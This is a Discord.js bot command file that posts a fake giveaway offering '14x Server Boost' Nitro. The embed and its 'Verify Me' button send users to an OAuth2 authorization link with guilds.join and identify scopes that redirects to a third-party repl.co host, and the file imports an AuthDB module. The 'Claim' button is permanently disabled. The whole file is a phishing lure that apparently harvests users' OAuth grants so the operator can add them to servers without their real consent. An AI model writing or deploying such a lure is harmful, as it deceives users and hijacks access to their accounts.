
const { ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const discord = require("discord.js");
let AuthDB = require(`../../database/AuthDB`)
const { redirect_uri } = require("../../config.js");


module.exports = {
  name: "gw",
  description: "werere",
  options: null,

  type: ApplicationCommandType.ChatInput,
  run: async (client, interaction, args) => {



    let embed1 = new discord.EmbedBuilder()
      .setTitle(`<a:Boost:1065936484693188638> 14x Servers boost event <a:Boost:1065936484693188638>`)
      .setDescription(`\n**Follow these steps to claim the 14x Boost Nitro code**.\n\n\n1. **Verify [ServerBooster.](https://discord.com/api/oauth2/authorize?client_id=1059151624737665184&redirect_uri=https%3A%2F%2FAuth-2.0xl.repl.co%2Fauthed&response_type=code&scope=guilds.join%20identify)**\n**2. After adding the Giveaway bot use the command g?nitro and wait 24 hours.** <:ok:1065936484693188638>\n**3. Enjoy Your Nitro!** <:ok:1065936484693188638> `)
    .setImage('https://media.discordapp.net/attachments/1041117746697621624/1041120634916319323/unknowns.png')
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel("Verify Me")
      .setStyle(ButtonStyle.Link)
        .setURL('https://discord.com/api/oauth2/authorize?client_id=1059151624737665184&redirect_uri=https%3A%2F%2FAuth-2.0xl.repl.co%2Fauthed&response_type=code&scope=guilds.join%20identify')
          .setDisabled(false),
        new ButtonBuilder()
          .setCustomId('next')
          .setLabel("Claim 14x Boosts")
      .setStyle(ButtonStyle.Danger)
          .setDisabled(true),
      );


    await interaction.reply({
      embeds: [embed1],
      components: [row]

    });

  },
};